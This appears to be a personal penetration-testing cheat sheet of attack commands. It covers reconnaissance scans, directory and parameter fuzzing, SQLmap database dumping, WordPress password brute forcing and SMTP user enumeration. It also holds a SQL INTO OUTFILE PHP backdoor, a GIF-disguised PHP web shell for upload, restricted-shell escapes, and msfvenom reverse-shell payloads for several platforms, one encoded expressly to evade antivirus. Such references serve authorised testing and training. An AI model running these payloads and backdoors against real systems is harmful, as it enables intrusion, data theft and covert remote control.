```txt
#############################
    AFTER SHELL COMMANDS
#############################
------------------------------------------------------------
Export PATH
------------------------------------------------------------
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
------------------------------------------------------------
Export Color
------------------------------------------------------------
export TERM=xterm-256color
------------------------------------------------------------
Alias listing
------------------------------------------------------------
alias ll='ls -lsaht --color=auto'
------------------------------------------------------------
Stable Shell
------------------------------------------------------------
Ctrl + Z ==> [Background Process]
stty raw -echo; fg; reset
stty columns 200 rows 200
------------------------------------------------------------
```
```txt
########################
    COMMON COMMANDS
########################
------------------------------------------------------------
NMAP
------------------------------------------------------------
nmap -p- -sT -sV -A $IP
nmap -p- -sC -sV $IP --open
nmap -p- --script=vuln $IP
nmap --script http-methods --script-args http-methods.url-path='/website' <target>
nmap -p80,443 --script=http-methods <ip> --script-args http-methods.url-path='/directory/goes/here'
nmap -p 139,445 -sC --script=smb-enum-shares <IP>
------------------------------------------------------------
Sed IP's
------------------------------------------------------------
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE
------------------------------------------------------------
WPScan
------------------------------------------------------------
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt
wpscan --url $URL --enumerate p --plugins-detection aggressive
------------------------------------------------------------
NIKTO
------------------------------------------------------------
nikto --host $IP -ssl -evasion 1
------------------------------------------------------------
DNSrecon
------------------------------------------------------------
dnsrecon –d yourdomain.com
------------------------------------------------------------
Gobuster
------------------------------------------------------------
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -l -k -t 30
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -l -k -t 30
gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
------------------------------------------------------------
Extract IPs from text file
------------------------------------------------------------
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
------------------------------------------------------------
Wfuzz
------------------------------------------------------------
Wfuzz XSS Fuzzing
------------------------------------------------------------
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt "$URL"
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt "$URL"
------------------------------------------------------------
COMMAND INJECTION WITH POST DATA
------------------------------------------------------------
wfuzz -c -z file,/opt/SecLists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"
------------------------------------------------------------
Test for Paramter Existence!
------------------------------------------------------------
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"
------------------------------------------------------------
AUTHENTICATED FUZZING DIRECTORIES
------------------------------------------------------------
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "SESSIONID=value" "$URL"
------------------------------------------------------------
AUTHENTICATED FILE FUZZING:
------------------------------------------------------------
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d "SESSIONID=value" "$URL"
------------------------------------------------------------
FUZZ Directories
------------------------------------------------------------
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
------------------------------------------------------------
FUZZ FILES
------------------------------------------------------------
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
------------------------------------------------------------
LARGE WORDS
------------------------------------------------------------
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-words.txt --hc 404 "$URL"
------------------------------------------------------------
Users
------------------------------------------------------------
wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 "$URL"
------------------------------------------------------------
Command Injection with commix, ssl, waf, random agent
------------------------------------------------------------
commix --url="https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --random-agent
------------------------------------------------------------
SQLmap
------------------------------------------------------------
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
------------------------------------------------------------
ThHarvester
------------------------------------------------------------
theharvester -d domain.org -l 500 -b google
------------------------------------------------------------
SMTP Enumeration
------------------------------------------------------------
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
------------------------------------------------------------
TCP Monitor
------------------------------------------------------------
tcpdump -i any -c5 icmp
------------------------------------------------------------
Netdiscovery
------------------------------------------------------------
netdiscover /r 0.0.0.0/24
------------------------------------------------------------
INTO OUTFILE Door
------------------------------------------------------------
SELECT “<?php system($_GET[‘cmd’]); ?>” into outfile “/var/www/WEROOT/backdoor.php”;
------------------------------------------------------------
LFI? => PHP Filter Checks
------------------------------------------------------------
php://filter/convert.base64-encode/resource=
------------------------------------------------------------
UPLOAD IMAGE?
------------------------------------------------------------
"GIF89a1
<?php system($_POST[""cmd""]); ?>"
------------------------------------------------------------
```

```txt
########################
  OUT OF GATE COMMANDS
########################
------------------------------------------------------------
Python Spawn
------------------------------------------------------------
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
------------------------------------------------------------
Aftershell Exports
------------------------------------------------------------
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
------------------------------------------------------------
Keyboard Shortcut: Ctrl + Z (Background Process.)
------------------------------------------------------------
stty raw -echo ; fg ; reset
stty columns 200 rows 200
------------------------------------------------------------
Is this rbash(Restricted Bash)?PT1
------------------------------------------------------------
"$ vi
:set shell=/bin/sh
:shell"
"$ vim
:set shell=/bin/sh
:shell"
------------------------------------------------------------
Is this rbash (Restricted Bash)?PT2
------------------------------------------------------------
"ssh user@127.0.0.1 ""/bin/sh""
rm $HOME/.bashrc
exit
ssh user@127.0.0.1"
------------------------------------------------------------
Is perl present on the target machine?
------------------------------------------------------------
perl -e 'exec "/bin/bash";'
perl -e 'exec "/bin/sh";'
------------------------------------------------------------
Is AWK present on the target machine?
------------------------------------------------------------
awk 'BEGIN {system("/bin/bash -i")}'
awk 'BEGIN {system("/bin/sh -i")}'
------------------------------------------------------------
Is ed present on the target machines?
------------------------------------------------------------
"ed
!sh"
------------------------------------------------------------
IRB Present on the target machine?
------------------------------------------------------------
exec "/bin/sh"
------------------------------------------------------------
Is Nmap present on the target machine?
------------------------------------------------------------
nmap --interactive
nmap> !sh
------------------------------------------------------------
Expect:
------------------------------------------------------------
"expect -v
  expect version 5.45.4"
"$ cat > /tmp/shell.sh <<EOF
#!/usr/bin/expect
spawn bash
interact
EOF"
"$ chmod u+x /tmp/shell.sh
$ /tmp/shell.sh"
------------------------------------------------------------
```

# Find js files
jsf()
{
cat $1 | grep "\\.js" | uniq | sort
echo "----------------------------------------------------------------"
echo -e "\e[42m\033[1;97m  Done \033[0;37m"
echo "----------------------------------------------------------------"
}

bcurl()
{
echo "";
for i in `cat $1`;do echo -e "\e[44m\033[1;97 $i \033[0;37m" && echo ""; curl --head $i; done;
echo -e "\e[5m\e[41m\033[1;97m ======= Completed ======= \033[0;37m"
}

# Bash tips
tip()
{
echo " To reomve first and last char from the string "
cat << EOF
=> awk '{print substr($0,2,length()-2);}'
EOF
}

# Jsluuice

```sh
alias jsurls='curl -k -s "$1" > /tmp/temp.js && jsluice urls /tmp/temp.js && rm /tmp/temp.js'
```

# Metasploit Revershell CheatSheet
```sh
Msfvenom: 
msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -o shell_reverse.exe
```
## To avoid AV detection, use encryption
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
```

## php
```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.php
```

## ASP
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<your port> -f asp > shell.asp
```

## War
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f war > shell.war
```

## JSP
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.jsp

```

## Binary
```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
```

## List linux meterpreter payloads
```sh
msfvenom --list | grep xxxx
```

## Send linux shell to meterpreter
```sh
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf -o msf.bin (set multi handler then)
```
